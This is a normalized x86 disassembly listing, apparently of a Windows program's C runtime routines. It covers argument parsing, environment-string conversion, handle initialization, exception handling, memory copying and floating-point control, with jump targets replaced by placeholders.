mov ebp esp
mov ecx [ ebp + 0x18 ]
mov eax [ ebp + 0x14 ]
push ebx
push esi
and [ ecx ] 0x0
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov [ eax ] 0x1
mov eax [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
inc [ ecx ]
test esi esi
je r-xdata
mov dl [ eax + 0x1 ]
inc eax
cmp dl 0x22
je r-xdata
mov dl [ eax ]
inc eax
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc [ ecx ]
test esi esi
je r-xdata
test dl dl
je r-xdata
cmp dl 0x20
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
cmp [ eax ] 0x22
jne r-xdata
and [ esi ] 0x0
inc esi
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
test dl dl
jne r-xdata
test dl dl
je r-xdata
inc eax
mov bl [ eax ]
mov [ esi ] bl
inc esi
and [ ebp + 0x18 ] 0x0
inc eax
jmp r-xdata
inc [ ecx ]
test esi esi
je r-xdata
inc [ ecx ]
test esi esi
je r-xdata
test esi esi
je r-xdata
dec eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
test edi edi
je r-xdata
mov dl [ eax ]
cmp dl 0x20
je r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov dl [ eax ]
mov [ esi ] dl
inc esi
inc eax
and [ esi - 0x1 ] 0x0
mov eax [ ebp + 0x14 ]
pop edi
pop esi
pop ebx
inc [ eax ]
pop ebp
retn
and [ edi ] 0x0
inc eax
jmp r-xdata
cmp dl 0x9
jne r-xdata
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edx [ ebp + 0x14 ]
inc [ edx ]
mov [ edi ] esi
add edi 0x4
mov [ ebp + 0xc ] edi
cmp [ eax ] 0x22
jne r-xdata
inc eax
inc ebx
jmp r-xdata
mov edx ebx
dec ebx
test edx edx
je r-xdata
test bl 0x1
jne r-xdata
cmp [ eax ] 0x5c
jne r-xdata
mov dl [ eax ]
test dl dl
je r-xdata
inc ebx
shr ebx 0x1
xor edi edi
cmp [ ebp + 0x18 ] edi
je r-xdata
test esi esi
je r-xdata
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
inc [ ecx ]
dec ebx
jne r-xdata
mov [ esi ] 0x5c
inc esi
mov [ ebp + 0x8 ] edi
cmp [ eax + 0x1 ] 0x22
lea edx [ eax + 0x1 ]
jne r-xdata
inc [ ecx ]
jmp r-xdata
and [ esi ] 0x0
inc esi
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp dl 0x20
je r-xdata
test esi esi
je r-xdata
mov eax edx
jmp r-xdata
cmp [ eax ] 0x0
je r-xdata
inc eax
jmp r-xdata
test esi esi
je r-xdata
cmp dl 0x9
je r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
cmp [ ebp + 0x18 ] edx
sete dl
mov [ ebp + 0x18 ] edx
mov [ ebp + 0x8 ] 0x1
xor ebx ebx
movzx edx dl
test [ edx + rw-data ] 0x4
je r-xdata
movzx ebx dl
test [ ebx + rw-data ] 0x4
je r-xdata
inc [ ecx ]
inc eax
inc [ ecx ]
mov dl [ eax ]
mov [ esi ] dl
inc esi
jmp r-xdata
mov [ esi ] dl
inc esi
inc eax
inc [ ecx ]
sub_409814
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push ebp
mov ebp [ GetEnvironmentStringsW@IAT ]
push esi
push edi
xor ebx ebx
xor esi esi
xor edi edi
cmp eax ebx
jne r-xdata
cmp eax 0x1
jne r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
cmp eax 0x2
jne r-xdata
cmp esi ebx
jne r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
cmp edi ebx
jne r-xdata
cmp [ esi ] bx
mov eax esi
je r-xdata
call ebp
mov esi eax
cmp esi ebx
je r-xdata
mov [ rw-data ] 0x2
jmp r-xdata
cmp [ edi ] bl
mov eax edi
je r-xdata
call [ GetEnvironmentStrings@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
sub eax esi
mov edi [ WideCharToMultiByte@IAT ]
sar eax 0x1
push ebx
push ebx
inc eax
push ebx
push ebx
push eax
push esi
push ebx
push ebx
mov [ esp + 0x34 ] eax
call edi
mov ebp eax
cmp ebp ebx
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
sub eax edi
inc eax
mov ebp eax
push ebp
call sub_4044f2
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
push esi
call [ FreeEnvironmentStringsW@IAT ]
mov eax ebx
jmp r-xdata
push ebp
call sub_4044f2
cmp eax ebx
pop ecx
mov [ esp + 0x10 ] eax
je r-xdata
inc eax
inc eax
cmp [ eax ] bx
jne r-xdata
push ebp
push edi
push esi
call sub_404860
add esp 0xc
xor esi esi
jmp r-xdata
inc eax
cmp [ eax ] bl
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
push ebx
push ebx
push ebp
push eax
push [ esp + 0x24 ]
push esi
push ebx
push ebx
call edi
test eax eax
jne r-xdata
push edi
call [ FreeEnvironmentStringsA@IAT ]
mov eax esi
jmp r-xdata
mov ebx [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_405bdc
pop ecx
mov [ esp + 0x10 ] ebx
sub_409946
sub esp 0x44
push ebx
push ebp
push esi
push edi
push 0x100
call sub_4044f2
mov esi eax
pop ecx
test esi esi
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x20
lea eax [ esi + 0x100 ]
push 0x1b
call sub_404de5
pop ecx
lea eax [ esp + 0x10 ]
push eax
call [ GetStartupInfoA@IAT ]
cmp [ esp + 0x42 ] 0x0
je r-xdata
and [ esi + 0x4 ] 0x0
or [ esi ] 0xffffffff
mov [ esi + 0x5 ] 0xa
mov eax [ rw-data ]
add esi 0x8
add eax 0x100
jmp r-xdata
xor ebx ebx
mov eax [ esp + 0x44 ]
test eax eax
je r-xdata
cmp esi eax
jae r-xdata
or [ esi + 0x4 ] 0x80
test ebx ebx
mov [ esi + 0x4 ] 0x81
jne r-xdata
mov esi [ eax ]
lea ebp [ eax + 0x4 ]
mov eax 0x800
cmp esi eax
lea ebx [ esi + ebp ]
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + ebx * 8 ] 0xffffffff
lea esi [ eax + ebx * 8 ]
jne r-xdata
push [ rw-data ]
call [ SetHandleCount@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn
mov eax ebx
dec eax
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
cmp [ rw-data ] esi
jge r-xdata
mov esi eax
or [ esi + 0x4 ] 0x40
jmp r-xdata
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
xor edi edi
test esi esi
jle r-xdata
mov edi rw-data
inc ebx
cmp ebx 0x3
jl r-xdata
and eax 0xff
mov [ esi ] edi
cmp eax 0x2
jne r-xdata
mov eax [ ebx ]
cmp eax 0xffffffff
je r-xdata
mov esi [ rw-data ]
add [ rw-data ] 0x20
mov [ edi ] eax
lea ecx [ eax + 0x100 ]
cmp eax 0x3
jne r-xdata
inc edi
inc ebp
add ebx 0x4
cmp edi esi
jl r-xdata
mov cl [ ebp ]
test cl 0x1
je r-xdata
add edi 0x4
cmp [ rw-data ] esi
jl r-xdata
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov ecx [ edi ]
add eax 0x8
add ecx 0x100
jmp r-xdata
or [ esi + 0x4 ] 0x8
jmp r-xdata
test cl 0x8
jne r-xdata
push 0x100
call sub_4044f2
test eax eax
pop ecx
je r-xdata
jmp r-xdata
cmp eax ecx
jae r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + ecx * 8 ]
mov ecx [ ebx ]
mov [ eax ] ecx
mov cl [ ebp ]
mov [ eax + 0x4 ] cl
push eax
call [ GetFileType@IAT ]
test eax eax
je r-xdata
sub_409af4
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_4041ae
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_40416c
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_4041ae
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_404242
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_409bd4
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_409c0d
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_409c0d
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_409c0d
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jb r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_40ab20
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_40ab20
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_40a890
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40a890
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_40a8a0
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40a8a0
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_40a8a0
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40c42b
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_40ab20
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_40c4c0
add esp 0x10
sub_409d60
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ eax + 0x10 ] 0x3
jne r-xdata
xor eax eax
push eax
call sub_409dfc
test eax eax
pop ecx
je r-xdata
cmp [ eax + 0x14 ] 0x19930520
jne r-xdata
push esi
call [ rw-data ]
jmp r-xdata
jmp sub_40567c
pop esi
retn 0x4
sub_409e20
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
inc edx
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
inc eax
retn
or al al
je r-xdata
or al al
je r-xdata
inc ecx
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_409eb0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_409f10 ]
jmp [ ecx * 4 + jump_table_409f8c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409ff8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409ff8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_40a190 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_40a098 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a190 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409ff8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409ff8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409ff8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_40a190 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a190 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a190 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_40a190 ]
sub_40a1fc
push ebp
mov ebp esp
push ecx
push esi
fwait
fnstcw [ ebp - 0x4 ]
push [ ebp - 0x4 ]
call sub_40a247
mov esi eax
mov eax [ ebp + 0xc ]
not eax
and esi eax
mov eax [ ebp + 0x8 ]
and eax [ ebp + 0xc ]
or esi eax
push esi
call sub_40a2d9
pop ecx
mov [ ebp + 0xc ] eax
pop ecx
fldcw [ ebp + 0xc ]
mov eax esi
pop esi
leave
retn
sub_40a247
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push ebp
test bl 0x1
push edi
je r-xdata
test bl 0x4
je r-xdata
push 0x10
pop eax
test bl 0x8
je r-xdata
or al 0x8
test bl 0x10
je r-xdata
or al 0x4
test bl 0x20
je r-xdata
or al 0x2
test bl 0x2
je r-xdata
or al 0x1
movzx ecx bx
push esi
mov edx ecx
mov esi 0xc00
mov edi 0x300
and edx esi
mov ebp 0x200
je r-xdata
or eax 0x80000
and ecx edi
pop esi
je r-xdata
cmp edx 0x400
je r-xdata
or eax 0x20000
cmp ecx ebp
jne r-xdata
or ah 0x1
cmp edx 0x800
je r-xdata
retn
or eax 0x40000
pop edi
pop ebp
test bh 0x10
pop ebx
je r-xdata
or eax 0x10000
jmp r-xdata
or eax ebp
jmp r-xdata
cmp edx esi
jne r-xdata
or eax edi
jmp r-xdata
sub_40a2d9
push ebx
mov ebx [ esp + 0x8 ]
xor eax eax
push esi
test bl 0x10
je r-xdata
test bl 0x8
je r-xdata
push 0x1
pop eax
test bl 0x4
je r-xdata
or al 0x4
test bl 0x2
je r-xdata
or al 0x8
test bl 0x1
je r-xdata
or al 0x10
test ebx 0x80000
je r-xdata
or al 0x20
mov ecx ebx
mov edx 0x300
and ecx edx
mov esi 0x200
je r-xdata
or al 0x2
mov ecx ebx
and ecx 0x30000
je r-xdata
cmp ecx 0x100
je r-xdata
or eax edx
cmp ecx 0x10000
jne r-xdata
or ah 0x4
cmp ecx esi
je r-xdata
retn
or ah 0x10
pop esi
test ebx 0x40000
pop ebx
je r-xdata
or eax esi
jmp r-xdata
or ah 0x8
jmp r-xdata
cmp ecx edx
jne r-xdata
or ah 0xc
jmp r-xdata
sub_40a362
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
ja r-xdata
mov ecx eax
push esi
mov esi [ rw-data ]
sar ecx 0x8
movzx edx cl
test [ esi + edx * 2 + 0x1 ] 0x80
pop esi
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
push 0x1
and [ ebp - 0x2 ] 0x0
mov [ ebp - 0x4 ] cl
mov [ ebp - 0x3 ] al
push 0x2
jmp r-xdata
and eax [ ebp + 0xc ]
leave
retn
movzx eax [ ebp + 0xa ]
leave
retn
pop eax
lea ecx [ ebp + 0xa ]
push 0x1
push 0x0
push 0x0
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_40c730
add esp 0x1c
test eax eax
jne r-xdata
sub_40a3d7
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
push ebx
push esi
push edi
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov edi 0x100
push 0x1
cmp ebx edi
pop esi
jge r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0x41
jl r-xdata
mov edx [ rw-data ]
mov eax ebx
sar eax 0x8
movzx ecx al
test [ edx + ecx * 2 + 0x1 ] 0x80
je r-xdata
cmp [ rw-data ] esi
jle r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x5a
jg r-xdata
and [ ebp + 0x9 ] 0x0
mov [ ebp + 0x8 ] bl
mov eax esi
and [ ebp + 0xa ] 0x0
push 0x2
mov [ ebp + 0x8 ] al
mov [ ebp + 0x9 ] bl
pop eax
jmp r-xdata
mov eax [ rw-data ]
mov al [ eax + ebx * 2 ]
and eax esi
push esi
push ebx
call sub_40a362
pop ecx
pop ecx
jmp r-xdata
add eax 0x20
jmp r-xdata
mov eax ebx
jmp r-xdata
cmp eax esi
jne r-xdata
push esi
push 0x0
lea ecx [ ebp - 0x4 ]
push 0x3
push ecx
push eax
lea eax [ ebp + 0x8 ]
push eax
push edi
push [ rw-data ]
call sub_40c879
add esp 0x20
test eax eax
je r-xdata
test eax eax
jne r-xdata
movzx eax [ ebp - 0x3 ]
movzx ecx [ ebp - 0x4 ]
shl eax 0x8
or eax ecx
movzx eax [ ebp - 0x4 ]
jmp r-xdata
sub_40a4a2
mov eax [ esp + 0x8 ]
push esi
push 0x20
cdq
pop ecx
idiv ecx
push 0x1f
mov esi eax
mov eax [ esp + 0x10 ]
cdq
idiv ecx
pop ecx
mov eax [ esp + 0x8 ]
sub ecx edx
or edx 0xffffffff
shl edx cl
not edx
test [ eax + esi * 4 ] edx
jne r-xdata
xor eax eax
pop esi
retn
inc esi
cmp esi 0x3
jge r-xdata
push 0x1
pop eax
pop esi
retn
lea eax [ eax + esi * 4 ]
inc esi
add eax 0x4
cmp esi 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
sub_40a4eb
mov eax [ esp + 0x8 ]
push ebx
push esi
push edi
push 0x20
mov ebx [ esp + 0x14 ]
cdq
pop ecx
idiv ecx
mov esi eax
mov eax [ esp + 0x14 ]
cdq
idiv ecx
lea edi [ ebx + esi * 4 ]
push edi
push 0x1f
pop ecx
push 0x1
pop eax
sub ecx edx
shl eax cl
push eax
push [ edi ]
call sub_40cac8
add esp 0xc
dec esi
js r-xdata
pop edi
pop esi
pop ebx
retn
lea edi [ ebx + esi * 4 ]
push edi
push 0x1
push [ edi ]
call sub_40cac8
add esp 0xc
dec esi
sub edi 0x4
test esi esi
jge r-xdata
test eax eax
je r-xdata
sub_40a541
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
lea edi [ eax - 0x1 ]
push 0x20
pop ecx
and [ ebp - 0x4 ] 0x0
lea ebx [ edi + 0x1 ]
push 0x20
mov eax ebx
pop esi
cdq
idiv ecx
push 0x1f
mov ecx eax
mov eax ebx
cdq
idiv esi
mov eax [ ebp + 0x8 ]
pop esi
push 0x1
mov [ ebp - 0x8 ] ecx
lea eax [ eax + ecx * 4 ]
mov [ ebp + 0xc ] eax
sub esi edx
pop edx
mov ecx esi
shl edx cl
test [ eax ] edx
je r-xdata
or edx 0xffffffff
mov ecx esi
shl edx cl
push 0x3
pop ecx
and [ eax ] edx
mov eax [ ebp - 0x8 ]
inc eax
cmp eax ecx
jge r-xdata
inc ebx
push ebx
push [ ebp + 0x8 ]
call sub_40a4a2
pop ecx
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx [ ebp + 0x8 ]
sub ecx eax
lea edi [ edx + eax * 4 ]
xor eax eax
[ edi ]
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_40a4eb
pop ecx
mov [ ebp - 0x4 ] eax
pop ecx
sub_40a5cd
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
push esi
push 0x3
sub ecx eax
pop edx
mov esi [ eax ]
mov [ ecx + eax ] esi
add eax 0x4
dec edx
jne r-xdata
pop esi
retn
sub_40a5f4
mov eax [ esp + 0x4 ]
xor ecx ecx
xor eax eax
retn
inc ecx
add eax 0x4
cmp ecx 0x3
jl r-xdata
cmp [ eax ] 0x0
jne r-xdata
push 0x1
pop eax
retn
sub_40a60f
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
push 0x20
mov edi [ ebp + 0x8 ]
pop ebx
or esi 0xffffffff
cdq
mov ecx ebx
mov [ ebp - 0x4 ] 0x3
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0xc ]
cdq
idiv ecx
and [ ebp + 0xc ] 0x0
mov ecx edx
shl esi cl
sub ebx edx
not esi
mov eax [ edi ]
mov ecx eax
and ecx esi
mov [ ebp - 0x8 ] ecx
mov ecx edx
shr eax cl
or eax [ ebp + 0xc ]
mov [ edi ] eax
mov eax [ ebp - 0x8 ]
mov ecx ebx
add edi 0x4
shl eax cl
dec [ ebp - 0x4 ]
mov [ ebp + 0xc ] eax
jne r-xdata
mov edi [ ebp - 0xc ]
push 0x2
pop ebx
mov esi edi
push 0x8
pop ecx
shl esi 0x2
mov eax [ ebp + 0x8 ]
and [ ecx + eax ] 0x0
mov edx [ ebp + 0x8 ]
mov eax ecx
sub eax esi
mov eax [ eax + edx ]
mov [ ecx + edx ] eax
jmp r-xdata
cmp ebx edi
jl r-xdata
pop edi
pop esi
pop ebx
leave
retn
dec ebx
sub ecx 0x4
jns r-xdata
sub_40a69c
push ebp
mov ebp esp
sub esp 0x18
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx ecx [ eax + 0xa ]
mov ebx ecx
and ecx 0x8000
mov [ ebp + 0x8 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
mov edi [ ebp + 0x10 ]
and ebx 0x7fff
sub ebx 0x3fff
mov [ ebp - 0x8 ] ecx
shl eax 0x10
cmp ebx 0xffffc001
mov [ ebp - 0x4 ] eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_40a5cd
push [ edi + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
call sub_40a541
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
xor esi esi
push eax
call sub_40a5f4
test eax eax
pop ecx
jne r-xdata
mov eax [ edi + 0x4 ]
mov ecx eax
sub ecx [ edi + 0x8 ]
cmp ebx ecx
jge r-xdata
inc ebx
xor eax eax
lea eax [ ebp - 0xc ]
push eax
call sub_40a5e8
pop ecx
cmp ebx eax
jg r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40a5e8
pop ecx
jmp r-xdata
cmp edi 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
